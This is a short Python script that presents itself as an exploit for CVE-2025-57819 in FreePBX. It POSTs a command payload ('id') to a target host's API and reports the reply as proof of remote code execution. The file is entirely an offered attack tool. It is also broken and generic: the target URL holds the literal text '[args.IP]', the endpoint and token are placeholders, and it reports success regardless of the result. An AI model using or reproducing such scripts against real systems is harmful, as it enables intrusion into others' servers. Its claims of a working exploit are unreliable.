#!/usr/bin/env python3

import argparse
import requests
import json
import sys

parser = argparse.ArgumentParser(prog='freepbx-breaker',
                    description='Exploit designed to exploit the vulnerability in CVE-2025-57819',
                    epilog='UwU')
parser.add_argument('IP')
parser.add_argument('PORT')
args = parser.parse_args()

TARGET_URL = "http://[args.IP]:[args.PORT]/api/endpoint_vulnerable"
TARGET_HEADERS = {
    "Content-Type": "application/json",
   
    "Authorization": "Bearer [TOKEN_IF_PRESENT]" 
}


MALICIOUS_PAYLOAD = {
    "input_data": "normal_parameter",
    "command": "id"  
}

def exploit_cve_2025_57819():
    """Execute the attack exploiting CVE-2025-57819 in FreePBX."""
    print("="*60)
    print("Initiating Exploit CVE-2025-57819 against FreePBX...")
    print(f"Target: {TARGET_URL}")
    print(f"Payload to Execute: {MALICIOUS_PAYLOAD['command']}")
    print("="*60)

    try:
        
        response = requests.post(
            TARGET_URL, 
            headers=TARGET_HEADERS, 
            json=MALICIOUS_PAYLOAD,
            timeout=15
        )

        print("\n" + "="*60)
        print(f"[SUCCESS] Request sent. HTTP status: {response.status_code}")
        print("="*60)

        
        print("\n--- SERVER RESPONSE ANALYSIS ---")

        try:
            
            json_data = response.json()
            print(" Response in JSON format:")
            print(json.dumps(json_data, indent=4))

            
            if 'output' in json_data:
                print(f"\n[INFO] Possible Command Departure (Output): {json_data['output']}")

        except requests.exceptions.JSONDecodeError:
           
            print("\n Plain text response (Possibly raw command output):")
            print("-" * 20)
            print(response.text)
            print("-" * 20)

        print("\n==========================================")
        print("[+] Exploitation complete. Check the output to confirm RCE.")
        print("==========================================")

    except requests.exceptions.Timeout:
        print("\n ERROR: Request timed out (Timeout). The server is slow or the port is incorrect.")
    except requests.exceptions.ConnectionError as e:
        print(f"\n Connection ERROR: Could not reach the server. Check IP and port: {e}")
    except Exception as e:
        print(f"\n An unexpected error occurred during execution: {e}")

if __name__ == "__main__":
    exploit_cve_2025_57819()
